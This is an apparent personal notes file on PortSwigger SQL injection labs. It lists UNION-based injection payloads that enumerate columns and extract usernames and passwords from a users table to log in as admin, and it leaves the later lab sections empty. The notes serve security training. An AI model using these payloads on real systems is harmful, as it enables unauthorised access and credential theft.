<div align="center">
  <h1>-------------------------- SQLi LABS 002 ---------------------------</h1>
</div>

# [CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Del it
## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified:
```
'Union+select+Null,NULL-- To determine the No. of columns
'Union+select+Null,'XYZ'-- To determine which column allows TEXT values
'Union+select+Null,username+from+users-- To retrieve Single TEXT value
'Union+select+Null,password+from+users-- To retrieve Single TEXT value
'Union+select+Null,username||password+from+users-- To retrieve Multiple TEXT value
'Union+select+Null,username||'~'||password+from+users-- To retrieve Multiple TEXT value with separator
```
- Login with Admin Creds to Solve the LAb
- ![image](https://github.com/user-attachments/assets/d73f2473-adfa-4ba2-beac-dfc914e9e354)


## Lab 10: Blind SQL injection with conditional responses [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#)







## Lab 11: [Link]()
